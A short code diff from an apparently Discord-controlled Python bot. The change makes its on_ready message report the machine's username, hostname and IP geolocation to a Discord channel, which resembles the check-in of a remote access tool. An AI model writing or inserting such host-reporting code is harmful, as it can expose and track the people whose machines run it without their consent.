@@ -141,7 +141,7 @@ async def on_ready():
                 IPloc = f"**Geolocation Data**:\nIP: {geolocation_data['query']}\nCountry: {geolocation_data['country']}\nRegion: {geolocation_data['regionName']}\nCity: {geolocation_data['city']}\nZip Code: {geolocation_data['zip']}\nISP: {geolocation_data['isp']}"
             else:
                 IPloc = "Error retrieving geolocation data."
-            running = f"Bot is ready and running!\n{IPloc}"
+            running = f"-----\n# Bot is ready and running!\n\nUSERNAME: {os.getlogin()}\nHOSTNAME: {os.getenv('HOSTNAME')}\n\n{IPloc}"
         else: running = "Bot is ready and running!"
 
         # Kanal erstellen und Berechtigungen setzen
